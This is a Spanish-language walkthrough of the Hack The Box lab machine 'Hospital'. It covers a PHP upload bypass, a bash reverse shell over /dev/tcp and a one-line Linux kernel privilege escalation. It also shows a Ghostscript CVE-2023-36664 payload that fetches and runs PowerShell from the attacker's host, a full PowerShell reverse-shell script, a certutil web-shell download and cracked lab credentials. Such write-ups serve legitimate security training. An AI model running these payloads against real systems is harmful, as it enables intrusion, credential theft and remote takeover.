# Hospital



***
- Source: https://app.hackthebox.com/machines/Hospital
- OS: Windows
- Dificultad: Medium
- IP: 10.10.11.241
- Temas: ``File Upload``, ``Code Injection``, `Win Enumeration`.
***
- Comenzamos con un escaneo de puertos, al ser una máquina Windows es probable que veamos bastantes:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Hospital]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.11.241
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 14:20 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 14:20
Scanning 10.10.11.241 [65535 ports]
Discovered open port 139/tcp on 10.10.11.241
Discovered open port 443/tcp on 10.10.11.241
Discovered open port 3389/tcp on 10.10.11.241
Discovered open port 53/tcp on 10.10.11.241
Discovered open port 135/tcp on 10.10.11.241
Discovered open port 445/tcp on 10.10.11.241
Discovered open port 22/tcp on 10.10.11.241
Discovered open port 8080/tcp on 10.10.11.241
Discovered open port 2105/tcp on 10.10.11.241
Discovered open port 464/tcp on 10.10.11.241
Discovered open port 1801/tcp on 10.10.11.241
Discovered open port 593/tcp on 10.10.11.241
Discovered open port 6617/tcp on 10.10.11.241
Discovered open port 6407/tcp on 10.10.11.241
Discovered open port 389/tcp on 10.10.11.241
Discovered open port 636/tcp on 10.10.11.241
Discovered open port 2179/tcp on 10.10.11.241
Discovered open port 3269/tcp on 10.10.11.241
Discovered open port 6409/tcp on 10.10.11.241
Discovered open port 9389/tcp on 10.10.11.241
Discovered open port 6061/tcp on 10.10.11.241
Discovered open port 6404/tcp on 10.10.11.241
Discovered open port 6635/tcp on 10.10.11.241
Discovered open port 6406/tcp on 10.10.11.241
Discovered open port 2107/tcp on 10.10.11.241
Discovered open port 3268/tcp on 10.10.11.241
Discovered open port 2103/tcp on 10.10.11.241
Discovered open port 88/tcp on 10.10.11.241
Discovered open port 5985/tcp on 10.10.11.241
Completed SYN Stealth Scan at 14:21, 47.52s elapsed (65535 total ports)
Initiating Service scan at 14:21
Scanning 29 services on 10.10.11.241
Service scan Timing: About 51.72% done; ETC: 14:23 (0:00:39 remaining)
Completed Service scan at 14:22, 77.96s elapsed (29 services on 1 host)
NSE: Script scanning 10.10.11.241.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:22
Completed NSE at 14:23, 4.14s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 4.88s elapsed
Nmap scan report for 10.10.11.241
Host is up, received user-set (2.1s latency).
Scanned at 2024-01-27 14:20:52 EST for 135s
Not shown: 65506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE           REASON          VERSION
22/tcp   open  ssh               syn-ack ttl 62  OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-01-28 02:21:49Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
1801/tcp open  msmq?             syn-ack ttl 127
2103/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2105/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2107/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2179/tcp open  vmrdp?            syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
3389/tcp open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services
5985/tcp open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6061/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6404/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6406/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6409/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6617/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6635/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
8080/tcp open  http              syn-ack ttl 62  Apache httpd 2.4.55 ((Ubuntu))
9389/tcp open  mc-nmf            syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.84 seconds
           Raw packets sent: 196565 (8.649MB) | Rcvd: 134 (5.884KB)
~~~

- Primero, podemos notar que el escaneo nos detecta dos sistemas operativos, Linux y Windows.
- De entre todos los puertos abiertos, los más obvios para enumerar primero parecieron aquellos que alojaban sitios web, los cuales eran el `443` con un servicio de correo IRedMail, y el `8080` con un server php:

- 8080:

![[Pasted image 20240127132540.png]]
- 443:

![[Pasted image 20240127132612.png]]

- Para el servicio de correo no encontré ninguna vulnerabilidad o algo por el estilo, así que decidí enumerar primero la página hosteada en el puerto 8080, me creé una cuenta con credenciales ``Retr0:123456`` y me encontré con un apartado para subir archivos:

![[Pasted image 20240127132852.png]]

- Creé un archivo con el siguiente contenido, para listar las funciones php permitidas en la página:

~~~php
<?php
	phpinfo();
?>
~~~

- Intenté subir el archivo php pero de primeras la página parecía responderme con errores de subida, así que probé con extensiones distintas a simplemente `php`, como `php4, php5, phtml`. Fue `phpar` la extensión que me permitió subir algo:

![[Pasted image 20240127133310.png]]

- Ahora bien, el archivo se subió, pero no sabemos a donde.
- Intenté buscar por algunos nombres de directorio comunes donde se pudiera subir el archivo, probé `uploads` y el recurso existía, pero no tenemos permisos de directory listing para este:

![[Pasted image 20240127133502.png]]

- Probé poner el nombre del archivo con la esperanza de que no lo encodeara de alguna forma, y en efecto, almacena los archivos con el mismo nombre:

![[Pasted image 20240127133613.png]]

- Ahora bien, hay bastantes comandos baneados en php, sobre todo los que más nos sirven para ejecutar archivos.
- Existe uno que podemos emplear y no está en la lista, el cual es `fopen`, que aplicándolo de cierta manera, nos puede ayudar a ejecutar comandos.
- Me creé un script básico en php que emplea este comando, empleando la creación de un proceso con el cual ejecutaremos nuestra instrucción:

~~~php
<?php
$comnd = "whoami";
$proc = popen($comnd, "r");
if (is_resource($proc)) {
    while (!feof($proc)) {
        $line = fgets($proc);
        echo $line;
    }
    pclose($proc);
}
?>
~~~

![[Pasted image 20240127134027.png]]

- Nos retorna un `www-data`
- Después de algunas pruebas más, noté que el script no me respondía a comandos de Windows, como `dir`, pero si a sus equivalentes en Linux, por lo que quizá esta es la parte del entorno que emplea un OS distinto.
- Modificamos un poco el script, cambiando la variable del comando a esta:

~~~php
$comnd = "bash -c 'bash -i >& /dev/tcp/10.10.16.34/4444 0>&1'";
~~~

- Nos ponemos en escucha por el respectivo puerto y deberíamos llegar a entablar una conexión:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Hospital]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.16.34] from (UNKNOWN) [10.10.11.241] 6544
bash: cannot set terminal process group (982): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$ whoami
whoami
www-data
~~~  

- Hacemos una sanitización de la TTY:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
<h3>Escalada a root:</h3>

- Enumeré algunas cosas, como archivos con SUID, GUID, credenciales en archivos de configuración, etc. Pero no encontré nada.
- Viendo que la IP no era la de nuestra máquina, pero tampoco la de un docker, me perdí, así que decidí listar el hardware con `lscpi`:

~~~bash
www-data@webserver:/var/www/html/uploads$ lspci
00:00.0 Host bridge: Intel Corporation 440BX/ZX/DX - 82443BX/ZX/DX Host bridge (AGP disabled) (rev 03)
00:07.0 ISA bridge: Intel Corporation 82371AB/EB/MB PIIX4 ISA (rev 01)
00:07.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01)
00:07.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 02)
00:08.0 VGA compatible controller: Microsoft Corporation Hyper-V virtual VGA
~~~

- Estamos en un entorno virtualizado `Hyper-V` de Microsoft, no nos ayuda mucho pero siempre es bueno saberlo.
- Listé también el Kernel, el cual estaba algo desactualizado:

~~~bash
www-data@webserver:/var/www/html/uploads$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
~~~

- Buscando un poco sobre PrivEsc local en versiones de Kernel 5.19, encontré una serie de comandos que podemos aplicar, los cuales se aprovechan de capabilities para convertirnos en usuario root:

~~~bash
www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap&& touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
root@webserver:/var/www/html/uploads# whoami
root
~~~


***
<h3>Salida del entorno Hyper-V :</h3>

- Ahora bien, no encontré nada que pudiéramos emplear para escapar del entorno virtualizado, así que opté por buscar credenciales de usuarios en `/etc/shadow`
- Encontré el hash de un usuario `drwilliams`:

~~~bash
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
~~~

- Lo crackeamos con John y tendríamos credenciales, ya las había conseguido anteriormente pero se me olvidó guardarlas, así que solo puedo mostrarlas con `--show`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Hospital]
└─$ john --show creds.hash
drwilliams:qwe123!@#:19612:0:99999:7:::

1 password hash cracked, 0 left
~~~

- Estas credenciales no parecen ser parte del sistema, así que quizá sean para el servicio de correo.
- Logramos acceder a la cuenta de `drwilliams`, y vemos que hay un correo bastante interesante:

  ![[Pasted image 20240127140837.png]]

- Se nos pide un archivo `PostScript` que posteriormente un Script se encargará de ejecutar.
- Lo que se me vino a la mente fue buscar algún método para inyectar código dentro del formato de archivo que se nos solicita.
- Encontré un [proyecto de GitHub](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) muy interesante desarrollado por **jakabakos**, que se encarga de hacer esto.
- El script nos solicita ciertos parámetros, para lo que buscamos, introduciremos lo siguiente:
  
~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Hospital]
└─$ python3 pyload.py --generate --payload "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.34/PS.ps1')" --filename 3d-file --extension eps
~~~

- Ahora bien, acabamos de añadir una instrucción con la cual se nos hará una request a un server en nuestra máquina atacante, para esto, debemos de contar un archivo PS.ps1 que se encargue de establecer la conexión y devolvernos una PowerShell:

~~~powershell
function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.34 -Port 6666
~~~

- Una vez que tengamos nuestro script, inicaremos un server de Python, al mismo tiempo que nos ponemos en escucha con `netcat`:
- Una vez que tengamos esto preparado, enviamos el archivo por correo:

![[Pasted image 20240127142719.png]]

- Y si todo fue realizado de manera correcta, deberíamos recibir una conexión casi al instante:

![[Pasted image 20240127142901.png]]

<h3>PrivEsc:</h3>
- Bien, probé enumerar distintos servicios que habían en el equipo pero no encontré nada, ni siquiera con herramientas como `mimikatz`.
- Solo encontré las contraseñas del usuario al que pertenecemos actualmente, hardcodeadas en el `GhostScript` dentro de la carpeta donde spawneamos:

~~~powershell
PS C:\Users\drbrown.HOSPITAL\Documents> dir

    Directory: C:\Users\drbrown.HOSPITAL\Documents

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/23/2023   3:33 PM            373 ghostscript.bat                                                       
PS C:\Users\drbrown.HOSPITAL\Documents> type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
~~~

- Decidí entrar a través de `evil-winrm`, ya que creo que es más cómodo:

~~~bash
┌──(kali💀Dedsec)-[~]
└─$ evil-winrm -i hospital.htb -u 'drbrown' -p 'chr!$br0wn' -N

Evil-WinRM shell v3.5

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents>
~~~

- Indagué un poco en el entorno, pero no encontré nada.
- Se me ocurrió utilizar las credenciales para enumerar el ``rpc``.

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Hospital]
└─$ rpcclient -U drbrown hospital.htb
Password for [WORKGROUP\drbrown]:
rpcclient $> quierydispinfo
command not found: quierydispinfo
rpcclient $> querydispinfo
index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH  Name: (null)    Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown       Name: Chris Brown       Desc: (null)
index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams    Name: Lucy Williams     Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}  Desc: (null)
index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8  Name: Microsoft Exchange        Desc: (null)
index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309  Name: Microsoft Exchange        Desc: (null)
index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db  Name: Microsoft Exchange        Desc: (null)
index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98  Name: Microsoft Exchange Migration      Desc: (null)
~~~

- En pocas palabras, esto nos dice que los usuarios pueden listar información del administrador, pues vemos que aparece en la query recibida:
- Fui al directorio `\xampp\htdocs` que es donde está hosteado el servicio de correo (en el puerto 443) y me di cuenta de que teníamos permisos de escritura.
- Guardé un [script webshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) en mi equipo y lo descargué con ``certuti`` desde la máquina victima:

~~~powershell
*Evil-WinRM* PS C:\xampp\htdocs> certutil -urlcache -split -f "http://10.10.16.34/powny-shell.php" "pwnysh3ll.php"
****  Online  ****
  0000  ...
  4f61
CertUtil: -URLCache command completed successfully.
~~~

 - Ahora solo fue cuestión de dirigirnos a la url que contenía este recurso y acceder como ``Authority System``.
 ![[Pasted image 20240127150539.png]]

- Y así concluimos esta máquina.
